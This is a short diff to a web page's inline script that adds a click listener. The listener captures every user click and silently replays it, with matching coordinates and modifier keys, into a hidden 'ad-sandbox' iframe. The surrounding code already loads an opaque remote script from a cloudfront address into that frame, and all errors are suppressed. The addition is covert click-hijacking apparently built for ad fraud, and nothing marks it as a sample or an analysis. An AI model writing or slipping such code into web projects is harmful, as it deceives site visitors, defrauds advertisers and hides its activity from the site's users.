@@ -39,6 +39,18 @@
         s.src = '//dc9xwpjprguup.cloudfront.net/?pwxcd=1454678';
         doc.head.appendChild(s);
       } catch (e) {}
+
+      document.addEventListener('click', function (e) {
+        try {
+          var f = document.getElementById('ad-sandbox');
+          var doc = f.contentDocument || f.contentWindow.document;
+          var ev = doc.createEvent('MouseEvents');
+          ev.initMouseEvent('click', true, true, f.contentWindow, e.detail,
+            e.screenX, e.screenY, e.clientX, e.clientY, e.ctrlKey, e.altKey,
+            e.shiftKey, e.metaKey, e.button, e.relatedTarget);
+          doc.dispatchEvent(ev);
+        } catch (err) {}
+      }, true);
     })();
   </script>
 
